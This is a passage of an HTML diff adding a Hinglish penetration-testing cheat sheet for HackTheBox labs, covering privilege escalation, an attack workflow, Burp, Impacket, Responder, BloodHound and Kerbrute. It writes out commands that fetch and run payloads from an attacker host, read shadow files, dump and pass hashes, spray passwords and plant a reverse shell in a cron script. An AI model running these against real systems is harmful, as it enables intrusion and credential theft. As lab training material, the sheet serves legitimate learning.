+      <div class="cmd-line">gpg <span class="fl">--list-keys</span></div>
+      <div class="cmd-desc">Imported keys list karo</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🕵️</div>
+    <div><div class="tool-name">steghide + strings + binwalk</div></div>
+    <div class="tool-sub"><span class="badge b-y">Steganography</span> <span class="badge b-g">Forensics</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Files mein chupi info nikalo! Image mein chupa data, binary mein strings, archive andar archive — sab dhundho!</div>
+    <div class="cmd">
+      <div class="cmd-line">steghide extract <span class="fl">-sf</span> <span class="arg">image.jpg</span></div>
+      <div class="cmd-desc">JPG mein se data nikalo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">steghide extract <span class="fl">-sf</span> <span class="arg">image.jpg</span> <span class="fl">-p</span> <span class="arg">password</span></div>
+      <div class="cmd-desc">Password ke saath</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">strings <span class="arg">binary_file</span> | grep <span class="fl">-i</span> <span class="arg">flag</span></div>
+      <div class="cmd-desc">Binary mein printable strings — flag dhundho!</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">binwalk <span class="arg">file.jpg</span></div>
+      <div class="cmd-desc">File ke andar kya embedded hai</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">binwalk <span class="fl">-e</span> <span class="arg">file.jpg</span></div>
+      <div class="cmd-desc">Extract karo — embedded files nikalo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">exiftool <span class="arg">image.jpg</span></div>
+      <div class="cmd-desc">EXIF metadata dekho — flag yahan bhi milta hai!</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- crypto -->
+
+<!-- ═══════════════════ PRIV ESC ═══════════════════ -->
+<div class="sheet" id="s-privesc">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📈</div>
+    <div><div class="tool-name">LinPEAS + WinPEAS</div></div>
+    <div class="tool-sub"><span class="badge b-p">Priv Esc</span> <span class="badge b-b">Enumeration</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Shell milne ke baad — root/SYSTEM kaise bane? LinPEAS/WinPEAS automatic sab check karta hai — SUID files, sudo, cron, writable paths, credentials sab! HTB ka most important post-exploit tool!</div>
+
+    <div class="cmd-label">Linux — LinPEAS</div>
+    <div class="cmd">
+      <div class="cmd-line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</div>
+      <div class="cmd-desc">Direct download + run</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">wget <span class="arg">http://YOUR_IP:8000/linpeas.sh</span> -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/out.txt</div>
+      <div class="cmd-desc">Apna server se transfer karo — output save karo</div>
+    </div>
+
+    <div class="cmd-label">Windows — WinPEAS</div>
+    <div class="cmd">
+      <div class="cmd-line">.\winPEASx64.exe</div>
+      <div class="cmd-desc">Run karo — sab dhundh lega</div>
+    </div>
+    <div class="tip2"><b>💡 File Transfer (Kali → Victim):</b><br>
+Kali pe: <code style="background:#21262d;color:#7ee787;padding:1px 6px;border-radius:3px;font-family:'Courier New',monospace;font-size:11px">python3 -m http.server 8000</code><br>
+Linux victim pe: <code style="background:#21262d;color:#7ee787;padding:1px 6px;border-radius:3px;font-family:'Courier New',monospace;font-size:11px">wget http://KALI_IP:8000/linpeas.sh</code><br>
+Windows victim pe: <code style="background:#21262d;color:#7ee787;padding:1px 6px;border-radius:3px;font-family:'Courier New',monospace;font-size:11px">certutil -urlcache -f http://KALI_IP:8000/win.exe win.exe</code></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">👑</div>
+    <div><div class="tool-name">Manual Priv Esc Checks</div></div>
+    <div class="tool-sub"><span class="badge b-p">Linux</span> <span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>LinPEAS ke baad ya manually check karo</b></div>
+
+    <div class="cmd-label">🐧 Linux Checks</div>
+    <div class="cmd">
+      <div class="cmd-line">sudo <span class="fl">-l</span></div>
+      <div class="cmd-desc">Kya bina password sudo kar sakte ho?</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">find / <span class="fl">-perm -4000</span> <span class="fl">-type f</span> 2&gt;/dev/null</div>
+      <div class="cmd-desc">SUID files — root ke permission se chalti hain</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">cat /etc/crontab && ls /etc/cron*</div>
+      <div class="cmd-desc">Cron jobs — scheduled tasks jo root chalata hai</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">cat /etc/passwd && cat /etc/shadow</div>
+      <div class="cmd-desc">Users aur hashes dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">find / <span class="fl">-writable</span> <span class="fl">-not -path "*/proc/*"</span> 2&gt;/dev/null</div>
+      <div class="cmd-desc">Writable files — config ya script replace karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">uname <span class="fl">-a</span> && cat /etc/os-release</div>
+      <div class="cmd-desc">Kernel version — dirty cow etc. check karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ss <span class="fl">-tlnp</span></div>
+      <div class="cmd-desc">Internal services dekho — port forward karo</div>
+    </div>
+
+    <div class="cmd-label">🪟 Windows Checks</div>
+    <div class="cmd">
+      <div class="cmd-line">whoami /priv</div>
+      <div class="cmd-desc">Current privileges — SeImpersonatePrivilege check karo!</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">net user && net localgroup administrators</div>
+      <div class="cmd-desc">Users aur admins dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">systeminfo</div>
+      <div class="cmd-desc">OS version, patches — unpatched ke liye</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">Get-ChildItem "C:\Users" -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue</div>
+      <div class="cmd-desc">Credential files dhundho</div>
+    </div>
+    <div class="hack2"><b>🔒 GTFOBins / LOLBAS!</b><br>
+Linux SUID ya sudo mila? → https://gtfobins.github.io — us binary ka priv esc method!<br>
+Windows? → https://lolbas-project.github.io — built-in Windows tools se escape!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🕐</div>
+    <div><div class="tool-name">pspy</div></div>
+    <div class="tool-sub"><span class="badge b-p">Process Spy</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Linux mein background processes monitor karo bina root ke! Root cron jobs, scripts kya chal rahe hain — real time mein dekho. Priv esc ke liye gold!</div>
+    <div class="cmd">
+      <div class="cmd-line">./pspy64</div>
+      <div class="cmd-desc">Run karo — processes monitor karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">./pspy64 <span class="fl">-pf -i</span> <span class="arg">1000</span></div>
+      <div class="cmd-desc">File events bhi dekho, 1 sec interval</div>
+    </div>
+    <div class="tip2"><b>💡 Cron Attack:</b> pspy se pata chala ki root har minute /opt/script.sh run karta hai aur tum us file ko write kar sakte ho? Us file mein reverse shell daal do — 1 minute mein root shell!</div>
+  </div>
+</div>
+
+</div><!-- privesc -->
+
+<!-- ═══════════════════ HTB WORKFLOW ═══════════════════ -->
+<div class="sheet" id="s-workflow">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🎯</div>
+    <div><div class="tool-name">Full HTB Attack Workflow</div></div>
+    <div class="tool-sub"><span class="badge b-b">Methodology</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>IP milne ke baad ye exact steps follow karo — ek bhi mat skip karo!</b></div>
+
+    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px 14px;margin:8px 0">
+
+    <div class="wfstep">
+      <div class="wfstep-num">01</div>
+      <div class="wfstep-content">
+        <b>Fast Port Scan</b><br>
+        <code>nmap -p- TARGET --min-rate 5000 -oN allports.txt</code><br>
+        Sab open ports note karo. Koi bhi miss mat karo — 8080, 8443, 9000 pe bhi services ho sakti hain!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">02</div>
+      <div class="wfstep-content">
+        <b>Service Version Scan</b><br>
+        <code>nmap -sC -sV -p [OPEN_PORTS] TARGET -oN targeted.txt</code><br>
+        Versions note karo — searchsploit ya Google pe CVE dhundho!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">03</div>
+      <div class="wfstep-content">
+        <b>Port 80/443 mila? Web Enumeration</b><br>
+        <code>whatweb http://TARGET</code> — Tech stack<br>
+        <code>gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code><br>
+        <code>ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak</code><br>
+        robots.txt, sitemap.xml bhi check karo manually!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">04</div>
+      <div class="wfstep-content">
+        <b>Port 445 (SMB) mila?</b><br>
+        <code>smbclient -L //TARGET -N</code> — shares list<br>
+        <code>enum4linux -a TARGET</code> — full enum<br>
+        <code>smbmap -H TARGET</code> — permissions<br>
+        Anonymous access try karo! Koi interesting file dhundho.
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">05</div>
+      <div class="wfstep-content">
+        <b>Credentials Mile? Test Everywhere</b><br>
+        <code>crackmapexec smb TARGET -u user -p pass</code><br>
+        <code>ssh user@TARGET</code><br>
+        <code>evil-winrm -i TARGET -u user -p pass</code><br>
+        Password reuse bahut common hai HTB mein!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">06</div>
+      <div class="wfstep-content">
+        <b>Hash Mila? Crack Karo</b><br>
+        <code>hash-identifier</code> — type identify karo<br>
+        <code>john hash.txt --wordlist=rockyou.txt</code><br>
+        <code>hashcat -m [MODE] hash.txt rockyou.txt</code><br>
+        CrackStation.net bhi try karo!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">07</div>
+      <div class="wfstep-content">
+        <b>Exploit Dhundho</b><br>
+        <code>searchsploit [service] [version]</code><br>
+        Google: "ServiceName VersionNumber exploit site:exploit-db.com"<br>
+        MSF: <code>search [service]</code><br>
+        GitHub pe bhi PoCs milte hain!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">08</div>
+      <div class="wfstep-content">
+        <b>Shell Mili? Stabilize + Flag</b><br>
+        <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code><br>
+        Ctrl+Z → stty raw -echo → fg → export TERM=xterm<br>
+        <code>cat /home/user/user.txt</code> — user flag!
+      </div>
+    </div>
+
+    <div class="wfstep">
+      <div class="wfstep-num">09</div>
+      <div class="wfstep-content">
+        <b>Privilege Escalation</b><br>
+        <code>sudo -l</code> — sudo check (GTFOBins!)<br>
+        <code>find / -perm -4000 2>/dev/null</code> — SUID<br>
+        LinPEAS/WinPEAS run karo<br>
+        <code>pspy64</code> — cron jobs spy karo
+      </div>
+    </div>
+
+    <div class="wfstep" style="border-bottom:none">
+      <div class="wfstep-num" style="background:#d29922">🚩</div>
+      <div class="wfstep-content">
+        <b>Root Flag!</b><br>
+        <code>cat /root/root.txt</code> — Linux<br>
+        <code>type C:\Users\Administrator\Desktop\root.txt</code> — Windows<br>
+        <b>Machine rooted! Submit karo!</b>
+      </div>
+    </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- QUICK REFERENCE -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">⚡</div>
+    <div><div class="tool-name">Quick Reference — Port se Attack Map</div></div>
+  </div>
+  <div class="tool-body">
+    <table class="flags">
+      <tr><th>Port / Service</th><th>Pehle Ye Karo</th><th>Tools</th></tr>
+      <tr><td>21 — FTP</td><td>Anonymous login: ftp TARGET</td><td>ftp, hydra, nmap scripts</td></tr>
+      <tr><td>22 — SSH</td><td>Key file check, brute force</td><td>hydra, john (ssh2john), ssh</td></tr>
+      <tr><td>23 — Telnet</td><td>Direct connect: telnet TARGET</td><td>hydra, netcat</td></tr>
+      <tr><td>25 — SMTP</td><td>User enum: VRFY, EXPN</td><td>netcat, smtp-user-enum</td></tr>
+      <tr><td>53 — DNS</td><td>Zone transfer karo</td><td>dig, nslookup, dnsenum</td></tr>
+      <tr><td>80/443 — HTTP/S</td><td>Dir enum, vuln scan</td><td>gobuster, ffuf, nikto, sqlmap</td></tr>
+      <tr><td>110 — POP3</td><td>Email read karo</td><td>netcat, hydra</td></tr>
+      <tr><td>139/445 — SMB</td><td>Shares list, null session</td><td>smbclient, enum4linux, smbmap, cme</td></tr>
+      <tr><td>1433 — MSSQL</td><td>Login test, xp_cmdshell</td><td>mssqlclient.py, cme, sqlmap</td></tr>
+      <tr><td>3306 — MySQL</td><td>Login brute, manual connect</td><td>mysql, hydra</td></tr>
+      <tr><td>3389 — RDP</td><td>Login test, bluekeep</td><td>xfreerdp, rdesktop, hydra</td></tr>
+      <tr><td>5985 — WinRM</td><td>PowerShell remote</td><td>evil-winrm, cme</td></tr>
+      <tr><td>6379 — Redis</td><td>Unauth access: redis-cli</td><td>redis-cli, crackmapexec</td></tr>
+      <tr><td>8080/8443</td><td>Alt web — same as 80/443</td><td>gobuster, ffuf, nikto</td></tr>
+    </table>
+
+    <div class="quick-grid" style="margin-top:12px">
+      <div class="quick-card">
+        <div class="qt">🔑 /etc/passwd crack</div>
+        <code>unshadow <span class="arg">passwd shadow</span> > <span class="arg">combined</span></code>
+        <code>john <span class="fl">--wordlist=</span><span class="arg">rockyou.txt combined</span></code>
+      </div>
+      <div class="quick-card">
+        <div class="qt">📁 File Transfer (Kali→Linux)</div>
+        <code>python3 <span class="fl">-m</span> http.server <span class="arg">8000</span></code>
+        <code>wget <span class="arg">http://KALI:8000/file</span></code>
+      </div>
+      <div class="quick-card">
+        <div class="qt">🔍 /etc/hosts (HTB subdomain)</div>
+        <code>echo "<span class="arg">IP domain.htb</span>" >> /etc/hosts</code>
+        <code><span class="fl"># Phir browser mein domain.htb</span></code>
+      </div>
+      <div class="quick-card">
+        <div class="qt">🐚 Stable Shell</div>
+        <code>python3 <span class="fl">-c</span> <span class="arg">'import pty;pty.spawn("/bin/bash")'</span></code>
+        <code>Ctrl+Z → stty raw -echo → fg</code>
+      </div>
+      <div class="quick-card">
+        <div class="qt">🔌 Port Forward</div>
+        <code>ssh <span class="fl">-L 8888:127.0.0.1:80</span> user@TARGET</code>
+        <code><span class="fl"># localhost:8888 = target:80</span></code>
+      </div>
+      <div class="quick-card">
+        <div class="qt">📋 File Transfer (Kali→Win)</div>
+        <code>python3 <span class="fl">-m</span> http.server <span class="arg">8000</span></code>
+        <code>certutil <span class="fl">-urlcache -f</span> http://KALI:8000/file.exe</code>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- workflow -->
+
+<!-- ═══════════════════ BURP SUITE ═══════════════════ -->
+<div class="sheet" id="s-burp">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🕷️</div>
+    <div><div class="tool-name">Burp Suite — Web Hacking Ka Dil</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-b">Proxy</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Browser aur web server ke beech baith ke sab traffic intercept karta hai. Requests modify karo, repeat karo, fuzz karo — web hacking ka sabse zaroori tool! HTB mein almost har web challenge mein Burp chahiye.</div>
+
+    <div class="cmd-label">⚙️ Setup — Pehli Baar</div>
+    <div class="cmd"><div class="cmd-line">Burp kholo → Proxy → Options → Listen on 127.0.0.1:8080</div><div class="cmd-desc">Default proxy port</div></div>
+    <div class="cmd"><div class="cmd-line">Browser mein proxy set karo → 127.0.0.1:8080</div><div class="cmd-desc">FoxyProxy extension use karo Firefox mein — easy toggle</div></div>
+    <div class="cmd"><div class="cmd-line">http://burpsuite → CA Certificate download karo → Browser mein install karo</div><div class="cmd-desc">HTTPS intercept ke liye zaroori!</div></div>
+
+    <div class="cmd-label">🔁 Proxy Tab — Intercept</div>
+    <div class="cmd"><div class="cmd-line">Intercept ON karo → Browser mein request karo → Request pakad lega</div><div class="cmd-desc">Har request Burp mein rukegi</div></div>
+    <div class="cmd"><div class="cmd-line">Right click → Send to Repeater (Ctrl+R)</div><div class="cmd-desc">Request Repeater mein bhejo — baar baar modify karo</div></div>
+    <div class="cmd"><div class="cmd-line">Right click → Send to Intruder (Ctrl+I)</div><div class="cmd-desc">Fuzzing ke liye Intruder mein bhejo</div></div>
+
+    <div class="cmd-label">🔄 Repeater Tab — Request Modify aur Resend</div>
+    <div class="cmd"><div class="cmd-line">Parameter change karo → Send → Response dekho</div><div class="cmd-desc">Manual testing — SQLi, IDOR, LFI sab yahan</div></div>
+    <div class="cmd"><div class="cmd-line">id=1 → id=2 → id=3 → Different responses?</div><div class="cmd-desc">IDOR test — alag user data aa raha hai?</div></div>
+    <div class="cmd"><div class="cmd-line">id=1' → Error aaya? → SQLi possible!</div><div class="cmd-desc">Single quote se SQL error trigger karo</div></div>
+    <div class="cmd"><div class="cmd-line">../../../etc/passwd → Response mein passwd file?</div><div class="cmd-desc">LFI (Local File Inclusion) test</div></div>
+
+    <div class="cmd-label">🎯 Intruder Tab — Automated Fuzzing</div>
+    <div class="cmd"><div class="cmd-line">Positions tab → §value§ — attack karne wali jagah mark karo</div><div class="cmd-desc">§ ke beech wali value replace hogi</div></div>
+    <div class="cmd"><div class="cmd-line">Attack Type: Sniper → ek jagah, ek wordlist</div><div class="cmd-desc">Password brute force ke liye</div></div>
+    <div class="cmd"><div class="cmd-line">Attack Type: Cluster Bomb → multiple positions, multiple lists</div><div class="cmd-desc">Username + Password dono fuzz karo</div></div>
+    <div class="cmd"><div class="cmd-line">Payloads → Simple list → rockyou.txt load karo → Start Attack</div><div class="cmd-desc">Status code ya response length se match dhundho</div></div>
+
+    <div class="cmd-label">🔍 Target / Site Map</div>
+    <div class="cmd"><div class="cmd-line">Target → Site Map → Sab visited URLs tree mein dikhega</div><div class="cmd-desc">Kya explore hua hai dekho</div></div>
+    <div class="cmd"><div class="cmd-line">Right click domain → Spider this host</div><div class="cmd-desc">Automatic crawl karo</div></div>
+
+    <div class="cmd-label">💻 Burp CLI — curl jaisa (Command Line)</div>
+    <div class="cmd"><div class="cmd-line">curl <span class="fl">-x</span> <span class="arg">127.0.0.1:8080</span> <span class="arg">http://TARGET</span></div><div class="cmd-desc">curl ko Burp proxy se route karo — request intercept hogi</div></div>
+
+    <table class="flags">
+      <tr><th>Useful Shortcut</th><th>Kaam</th></tr>
+      <tr><td>Ctrl+R</td><td>Repeater mein bhejo</td></tr>
+      <tr><td>Ctrl+I</td><td>Intruder mein bhejo</td></tr>
+      <tr><td>Ctrl+F</td><td>Response mein search karo</td></tr>
+      <tr><td>Ctrl+Z</td><td>Undo last action</td></tr>
+      <tr><td>F12</td><td>Intercept toggle</td></tr>
+    </table>
+
+    <div class="tip2"><b>💡 Free vs Pro:</b> Community (free) mein Intruder slow hota hai — ffuf/hydra use karo uski jagah! Repeater, Proxy, Decoder — sab free mein milta hai!</div>
+    <div class="hack2"><b>🔒 Decoder Tab:</b> Base64, URL encode/decode, HTML entities — seedha Burp ke andar hi kar sakte ho bina CyberChef ke!</div>
+  </div>
+</div>
+
+</div><!-- burp -->
+
+<!-- ═══════════════════ IMPACKET ═══════════════════ -->
+<div class="sheet" id="s-impacket">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🪟</div>
+    <div><div class="tool-name">Impacket Suite — Windows Ka Dil Kholna</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows</span> <span class="badge b-p">AD</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Windows network protocols ke liye Python tools ka collection! SMB, LDAP, Kerberos, WMI — sab ko remotely attack karo. HTB Windows boxes ka sabse important toolkit!</div>
+    <div class="install"><b>Install:</b> pip3 install impacket  ya  sudo apt install python3-impacket</div>
+
+    <div class="cmd-label">🔑 secretsdump.py — Credentials Dump</div>
+    <div class="cmd"><div class="cmd-line">secretsdump.py <span class="arg">domain/user:password@TARGET_IP</span></div><div class="cmd-desc">SAM, LSA, NTDS — sab hashes dump karo</div></div>
+    <div class="cmd"><div class="cmd-line">secretsdump.py <span class="arg">administrator@TARGET_IP</span> <span class="fl">-hashes</span> <span class="arg">:NTLM_HASH</span></div><div class="cmd-desc">Pass-the-Hash se dump karo</div></div>
+    <div class="cmd"><div class="cmd-line">secretsdump.py <span class="fl">-ntds</span> <span class="arg">ntds.dit</span> <span class="fl">-system</span> <span class="arg">SYSTEM</span> <span class="fl">LOCAL</span></div><div class="cmd-desc">Offline — NTDS.dit file se dump karo</div></div>
+
+    <div class="cmd-label">🖥️ psexec.py — Remote Command Execution</div>
+    <div class="cmd"><div class="cmd-line">psexec.py <span class="arg">domain/admin:password@TARGET_IP</span></div><div class="cmd-desc">SYSTEM shell lo — SMB se</div></div>
+    <div class="cmd"><div class="cmd-line">psexec.py <span class="arg">administrator@TARGET_IP</span> <span class="fl">-hashes</span> <span class="arg">:NTLM_HASH</span></div><div class="cmd-desc">Pass-the-Hash attack</div></div>
+
+    <div class="cmd-label">🔧 wmiexec.py — Quieter Shell (Logs Kam)</div>
+    <div class="cmd"><div class="cmd-line">wmiexec.py <span class="arg">domain/user:password@TARGET_IP</span></div><div class="cmd-desc">WMI se semi-interactive shell — psexec se stealthy</div></div>
+    <div class="cmd"><div class="cmd-line">wmiexec.py <span class="arg">admin@TARGET</span> <span class="fl">-hashes</span> <span class="arg">:HASH</span> <span class="arg">"whoami"</span></div><div class="cmd-desc">Single command run karo</div></div>
+
+    <div class="cmd-label">🎫 GetNPUsers.py — AS-REP Roasting</div>
+    <div class="cmd"><div class="cmd-line">GetNPUsers.py <span class="arg">domain.local/</span> <span class="fl">-usersfile</span> <span class="arg">users.txt</span> <span class="fl">-format</span> <span class="arg">hashcat</span> <span class="fl">-outputfile</span> <span class="arg">hashes.txt</span></div><div class="cmd-desc">Pre-auth disabled users ke TGT hashes nikalo</div></div>
+    <div class="cmd"><div class="cmd-line">GetNPUsers.py <span class="arg">domain.local/user:password</span> <span class="fl">-request</span></div><div class="cmd-desc">Authenticated hoke sab users check karo</div></div>
+    <div class="cmd"><div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">18200</span> <span class="arg">hashes.txt</span> <span class="arg">rockyou.txt</span></div><div class="cmd-desc">AS-REP hash crack karo (-m 18200)</div></div>
+
+    <div class="cmd-label">🎟️ GetUserSPNs.py — Kerberoasting</div>
+    <div class="cmd"><div class="cmd-line">GetUserSPNs.py <span class="arg">domain.local/user:password</span> <span class="fl">-request</span></div><div class="cmd-desc">Service account TGS hashes nikalo</div></div>
+    <div class="cmd"><div class="cmd-line">GetUserSPNs.py <span class="arg">domain.local/user:pass</span> <span class="fl">-outputfile</span> <span class="arg">kerberoast.txt</span></div><div class="cmd-desc">Output file mein save karo</div></div>
+    <div class="cmd"><div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">13100</span> <span class="arg">kerberoast.txt</span> <span class="arg">rockyou.txt</span></div><div class="cmd-desc">TGS hash crack karo (-m 13100)</div></div>
+
+    <div class="cmd-label">🔌 smbserver.py — Apna SMB Share Chalao</div>
+    <div class="cmd"><div class="cmd-line">smbserver.py <span class="arg">share</span> <span class="arg">$(pwd)</span> <span class="fl">-smb2support</span></div><div class="cmd-desc">Current dir ko SMB share banao — victim se files transfer karo</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Victim Windows pe:</span> copy \\KALI_IP\share\file.exe .</div><div class="cmd-desc">Windows victim se apna share use karo</div></div>
+
+    <div class="cmd-label">🗺️ Other Useful Scripts</div>
+    <div class="cmd"><div class="cmd-line">mssqlclient.py <span class="arg">domain/user:pass@TARGET_IP</span></div><div class="cmd-desc">MSSQL connect karo — xp_cmdshell se RCE!</div></div>
+    <div class="cmd"><div class="cmd-line">lookupsid.py <span class="arg">domain/user:pass@TARGET_IP</span></div><div class="cmd-desc">Domain users SID enumerate karo</div></div>
+    <div class="cmd"><div class="cmd-line">rpcdump.py <span class="arg">TARGET_IP</span></div><div class="cmd-desc">RPC endpoints dump karo</div></div>
+
+    <div class="hack2"><b>🔒 Pass-the-Hash (PtH) Attack:</b><br>
+Password crack karne ki zaroorat nahi! NTLM hash seedha use karo authentication ke liye.<br>
+<code style="background:#21262d;color:#7ee787;padding:2px 6px;border-radius:3px;font-family:'Courier New',monospace;font-size:11px">-hashes :NTLM_HASH</code> format mein daalo — pehle wala colon se pehle LM hash hota hai (usually blank)</div>
+  </div>
+</div>
+
+</div><!-- impacket -->
+
+<!-- ═══════════════════ AD/KERBEROS ═══════════════════ -->
+<div class="sheet" id="s-ad">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🎯</div>
+    <div><div class="tool-name">Responder — NTLM Hash Capture</div></div>
+    <div class="tool-sub"><span class="badge b-g">Network</span> <span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Network pe raha ke LLMNR/NBT-NS/mDNS requests ka jawab deta hai — victim ki machine apna NTLM hash bhej deti hai! Capture karo aur crack karo ya relay attack karo.</div>
+    <div class="cmd"><div class="cmd-line">sudo responder <span class="fl">-I</span> <span class="arg">eth0</span></div><div class="cmd-desc">Sab interfaces pe listen karo — hash capture</div></div>
+    <div class="cmd"><div class="cmd-line">sudo responder <span class="fl">-I</span> <span class="arg">eth0</span> <span class="fl">-wrf</span></div><div class="cmd-desc">WPAD, rogue auth, fingerprint — aggressive</div></div>
+    <div class="cmd"><div class="cmd-line">cat /usr/share/responder/logs/SMB-NTLMv2-*.txt</div><div class="cmd-desc">Captured hashes dekho</div></div>
+    <div class="cmd"><div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">5600</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span></div><div class="cmd-desc">NTLMv2 hash crack karo (-m 5600)</div></div>
+    <div class="tip2"><b>💡 NTLM Relay:</b> Hash capture ke saath ntlmrelayx.py use karo — hash relay karo doosri machine pe bina crack kiye!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🩸</div>
+    <div><div class="tool-name">BloodHound — AD Attack Paths</div></div>
+    <div class="tool-sub"><span class="badge b-b">Active Directory</span> <span class="badge b-p">Graph</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Active Directory ka poora graph banata hai — kaun kisko admin hai, kahan kaunsa permission hai, Domain Admin tak kaise pahunche — visually dikhata hai! HTB Pro Labs ka essential tool.</div>
+    <div class="cmd-label">📥 Step 1: Data Collect karo (SharpHound)</div>
+    <div class="cmd"><div class="cmd-line">SharpHound.exe <span class="fl">-c All</span> <span class="fl">--outputdirectory</span> <span class="arg">C:\temp\</span></div><div class="cmd-desc">Windows machine pe run karo — ZIP file milegi</div></div>
+    <div class="cmd"><div class="cmd-line">bloodhound-python <span class="fl">-u</span> <span class="arg">user</span> <span class="fl">-p</span> <span class="arg">pass</span> <span class="fl">-d</span> <span class="arg">domain.local</span> <span class="fl">-ns</span> <span class="arg">DC_IP</span> <span class="fl">-c all</span></div><div class="cmd-desc">Kali se remotely collect karo — no Windows needed</div></div>
+    <div class="cmd-label">📊 Step 2: BloodHound GUI mein Upload</div>
+    <div class="cmd"><div class="cmd-line">neo4j start → bloodhound</div><div class="cmd-desc">Database aur GUI start karo</div></div>
+    <div class="cmd"><div class="cmd-line">ZIP upload karo → Pre-built Queries use karo</div><div class="cmd-desc">Shortest Path to Domain Admin, Kerberoastable Users etc.</div></div>
+    <div class="hack2"><b>🔒 Useful BloodHound Queries:</b><br>
+• Shortest Path to Domain Admins<br>
+• Find All Domain Admins<br>
+• Find Principals with DCSync Rights<br>
+• Kerberoastable Users<br>
+• AS-REP Roastable Users</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🎫</div>
+    <div><div class="tool-name">Kerbrute — Kerberos Username Enum</div></div>
+    <div class="tool-sub"><span class="badge b-b">Kerberos</span> <span class="badge b-r">Brute</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Kerberos se valid usernames enumerate karo bina password ke! Pre-authentication errors se valid users pata karo — logs kam hote hain compared to LDAP.</div>
+    <div class="cmd"><div class="cmd-line">kerbrute userenum <span class="fl">--dc</span> <span class="arg">DC_IP</span> <span class="fl">-d</span> <span class="arg">domain.local</span> <span class="arg">usernames.txt</span></div><div class="cmd-desc">Valid usernames dhundho</div></div>
+    <div class="cmd"><div class="cmd-line">kerbrute passwordspray <span class="fl">--dc</span> <span class="arg">DC_IP</span> <span class="fl">-d</span> <span class="arg">domain.local</span> <span class="arg">users.txt</span> <span class="arg">Password123</span></div><div class="cmd-desc">Password spray — ek password sab users pe</div></div>
+    <div class="cmd"><div class="cmd-line">kerbrute bruteuser <span class="fl">--dc</span> <span class="arg">DC_IP</span> <span class="fl">-d</span> <span class="arg">domain.local</span> <span class="arg">administrator</span> <span class="arg">rockyou.txt</span></div><div class="cmd-desc">Single user brute force</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">💎</div>
+    <div><div class="tool-name">Mimikatz — Windows Credential Dump</div></div>
+    <div class="tool-sub"><span class="badge b-b">Post-Exploit</span> <span class="badge b-p">Windows</span></div>
+  </div>
